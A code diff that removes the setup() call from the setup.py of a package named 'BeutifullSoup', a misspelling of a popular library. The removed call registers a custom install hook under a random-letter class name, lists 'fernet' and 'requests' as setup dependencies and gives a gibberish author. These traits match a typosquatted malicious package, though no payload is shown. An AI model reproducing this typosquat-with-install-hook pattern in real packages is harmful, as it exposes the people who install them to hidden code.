@@ -18,22 +18,5 @@ class EqcwEUONZVnSucWpXriyQunQgrrKQWTLkWeInPXwAUIawZJmHAHmWbzRGUJeaWjQykMZKGfXnQ
             install.run(self)
 
 
-setup(
-    name="BeutifullSoup",
-    version=VERSION,
-    author="YFMQXCtQ",
-    author_email="MWrMFKJQIKcTx@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': EqcwEUONZVnSucWpXriyQunQgrrKQWTLkWeInPXwAUIawZJmHAHmWbzRGUJeaWjQykMZKGfXnQzuBQnbQKCJmjBrLzgXieKcdDuEQOoDpTzRrPUAVDGoJAOtjbejirFxgxAasQDZvJUxPFdfPxNbJqVavtzGhKYrkSyvxCBftvVNkQCJQTdElNxJAuyaAIhPpcUSzQ,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
 
